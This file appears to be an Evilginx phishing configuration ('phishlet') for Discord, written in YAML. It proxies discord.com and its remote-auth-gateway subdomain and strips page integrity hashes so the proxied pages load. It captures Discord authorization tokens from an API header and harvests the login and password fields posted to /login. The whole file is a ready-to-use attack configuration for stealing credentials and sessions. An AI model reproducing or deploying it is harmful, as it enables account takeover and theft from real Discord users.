author: '@StephanWithPH'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'discord.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'remote-auth-gateway', orig_sub: 'remote-auth-gateway', domain: 'discord.com', session: true, is_landing: false, auto_filter: true}
sub_filters:
  - {triggers_on: 'discord.com', orig_sub: '', domain: 'discord.com', search: 'sha256-.{140}', replace: '', mimes: ['text/html']}
auth_tokens:
  - domain: 'discord.com'
    path: '/api/v9/users/@me/affinities/guilds'
    name: 'token'
    header: 'authorization'
    type: 'http'
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'discord.com'
  path: '/login'
